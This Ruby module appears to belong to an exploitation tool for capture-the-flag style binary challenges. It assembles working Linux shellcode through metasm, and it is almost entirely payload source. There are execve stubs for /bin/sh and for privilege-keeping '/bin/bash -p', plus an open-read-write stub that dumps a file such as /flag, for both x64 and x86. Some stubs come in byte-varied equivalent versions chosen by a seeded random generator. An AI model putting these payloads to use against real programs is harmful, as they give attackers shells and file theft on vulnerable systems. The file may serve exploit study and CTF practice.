# frozen_string_literal: true

require "metasm"

module AugureProfiler
  # The target's word size, from the ELF class: which shellcode variant
  # to assemble and how wide the return address is.
  def self.arch(path)
    elf = Metasm::ELF.decode_file(path)
    (elf.header.e_class.to_s == "64") ? :x64 : :x86
  end

  # The payload source: assembly TEXT, versioned and auditable, assembled
  # on demand. No hex blobs - the shellcode of the original tool (%shc in
  # dbg.pm) becomes readable source assembled by metasm, which the
  # profiler already depends on. The call-back layout keeps every stub
  # position-independent without relocations.
  #
  # Each stub carries EQUIVALENT VARIANTS (the ghost-writing idea from
  # the metasm talks): same semantics, different bytes. rng: a seeded
  # Random - the variant picked is deterministic per seed, so the audit
  # can reproduce the exact payload.
  module Shellcode
    SOURCES = {
      sh: {
        x64: [
          <<~ASM,
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop rdi
              xor esi, esi
              xor edx, edx
              push 59
              pop rax
              syscall
          ASM
          <<~ASM
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop rdi
              push 0
              pop rsi
              push 59
              pop rax
              cdq
              syscall
          ASM
        ],
        x86: [
          <<~ASM,
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop ebx
              xor ecx, ecx
              push 11
              pop eax
              int 80h
          ASM
          <<~ASM
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop ebx
              push 11
              pop eax
              cdq
              xor ecx, ecx
              int 80h
          ASM
        ]
      },
      orw: {
        x64: [
          <<~ASM
            call readflag
            path:
              db "PATH_SLOT", 0
            readflag:
              pop rdi
              push 2
              pop rax
              xor esi, esi
              xor edx, edx
              syscall
              mov rdi, rax
              sub rsp, 128
              mov rsi, rsp
              push 64
              pop rdx
              push 0
              pop rax
              syscall
              mov rdx, rax
              mov rsi, rsp
              push 1
              pop rdi
              push 1
              pop rax
              syscall
              push 60
              pop rax
              xor edi, edi
              syscall
          ASM
        ],
        x86: [
          <<~ASM
            call readflag
            path:
              db "PATH_SLOT", 0
            readflag:
              pop ebx
              xor ecx, ecx
              xor edx, edx
              mov eax, 5
              int 80h
              mov ebx, eax
              sub esp, 128
              mov ecx, esp
              mov edx, 64
              mov eax, 3
              int 80h
              mov edx, eax
              mov ecx, esp
              mov ebx, 1
              mov eax, 4
              int 80h
          ASM
        ]
      },
      bash: {
        x64: [
          <<~ASM
            call shellcode
            path:
              db "/bin/bash", 0
            arg:
              db "-p", 0
            shellcode:
              pop rdi
              lea rsi, [rdi+10]
              push 0
              mov rdx, rsp
              push rsi
              push rdi
              mov rsi, rsp
              pop rdi
              mov eax, 59
              syscall
          ASM
        ],
        x86: [
          <<~ASM
            call shellcode
            path:
              db "/bin/bash", 0
            arg:
              db "-p", 0
            shellcode:
              pop ebx
              lea ecx, [ebx+10]
              push 0
              mov edx, esp
              push ecx
              push ebx
              mov ecx, esp
              mov eax, 11
              int 80h
          ASM
        ]
      }
    }.freeze

    # klass: Metasm::X64 or Metasm::Ia32 (the target architecture).
    # path: the parameter for the path-bearing stubs (sh/bash exec the
    # path; orw reads it - the seccomp answer reads /flag, not a shell).
    # Returns the assembled bytes.
    def self.generate(klass, stub = :sh, path: nil, rng: nil)
      arch = (klass == Metasm::X64) ? :x64 : :x86
      variants = SOURCES.fetch(stub).fetch(arch)
      source = rng ? variants.sample(random: rng) : variants.first
      source = source.gsub("PATH_SLOT", path.to_s) if path
      raise ArgumentError, "this stub needs a path" if source.include?("PATH_SLOT")

      Metasm::Shellcode.assemble(klass.new, source).encode_string
    end
  end
end
